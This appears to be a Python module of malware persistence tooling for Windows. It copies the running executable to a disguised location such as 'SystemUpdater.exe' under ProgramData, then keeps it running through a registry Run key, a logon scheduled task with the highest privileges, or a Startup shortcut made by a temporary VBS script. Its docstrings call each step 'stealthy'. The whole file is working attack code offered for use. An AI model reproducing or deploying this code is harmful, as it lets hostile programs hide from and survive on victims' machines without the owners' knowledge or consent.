import os
import sys
import shutil
import winreg
import subprocess
from pathlib import Path


def copy_executable(destination_folder: str, new_name: str = None) -> str:
    """
    Copies the current executable to the destination folder with a new name.
    :param destination_folder: Path to the destination folder.
    :param new_name: New name for the executable. If None, uses a generic system-like name.
    :return: Full path to the copied executable.
    """
    current_path = sys.argv[0]
    if not new_name:
        new_name = "SystemUpdater.exe"  # Default stealthy name
    destination_path = os.path.join(destination_folder, new_name)
    os.makedirs(destination_folder, exist_ok=True)
    shutil.copy2(current_path, destination_path)
    return destination_path


def set_registry_run_key(executable_path: str, key_name: str = "SystemTask"):
    """
    Adds a stealthy registry key for startup in the user's registry.
    :param executable_path: Path to the executable to register.
    :param key_name: Registry key name (default: 'SystemTask').
    """
    with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                        r"Software\Microsoft\Windows\CurrentVersion\Run",
                        0, winreg.KEY_SET_VALUE) as key:
        winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, executable_path)


def create_scheduled_task(task_name: str, executable_path: str):
    """
    Creates a stealthy scheduled task for startup.
    :param task_name: Name of the scheduled task.
    :param executable_path: Path to the executable to register.
    """
    command = [
        "schtasks",
        "/Create",
        "/TN", task_name,
        "/TR", executable_path,
        "/SC", "ONLOGON",
        "/RL", "HIGHEST",
        "/F"
    ]
    subprocess.run(command, check=True)


def create_startup_shortcut(executable_path: str, shortcut_name: str = "Updater.lnk"):
    """
    Creates a stealthy shortcut to the executable in the Startup folder.
    :param executable_path: Path to the executable to link.
    :param shortcut_name: Name of the shortcut.
    """
    startup_folder = os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup")
    shortcut_path = os.path.join(startup_folder, shortcut_name)

    # Create the shortcut using Windows Script Host
    script = f"""
    Set oWS = WScript.CreateObject("WScript.Shell")
    sLinkFile = "{shortcut_path}"
    Set oLink = oWS.CreateShortcut(sLinkFile)
    oLink.TargetPath = "{executable_path}"
    oLink.Save
    """
    script_path = os.path.join(os.getenv("TEMP"), "create_shortcut.vbs")
    with open(script_path, "w") as file:
        file.write(script)
    subprocess.run(["cscript", "//nologo", script_path], check=True)
    os.remove(script_path)


def apply_persistence(method: str = "registry",
                      destination_folder: str = None,
                      stealth_name: str = None,
                      key_name: str = None):
    """
    Automatically applies one persistence technique after copying the executable.
    :param method: Persistence method ('registry', 'task', or 'shortcut').
    :param destination_folder: The directory to copy the executable. Defaults to ProgramData.
    :param stealth_name: Stealthy name for the copied executable. Defaults to 'SystemUpdater.exe'.
    :param key_name: Optional key name for the registry, task, or shortcut.
    """
    if not destination_folder:
        destination_folder = os.path.join(os.getenv("PROGRAMDATA"), "SystemServices")

    # Copy the executable to a stealthy location
    executable_path = copy_executable(destination_folder, new_name=stealth_name)

    # Apply the specified persistence method
    if method == "registry":
        key_name = key_name or "SystemTask"
        set_registry_run_key(executable_path, key_name)
    elif method == "task":
        key_name = key_name or "SystemUpdateTask"
        create_scheduled_task(key_name, executable_path)
    elif method == "shortcut":
        key_name = key_name or "Updater.lnk"
        create_startup_shortcut(executable_path, key_name)
    else:
        raise ValueError(f"Unknown persistence method: {method}")
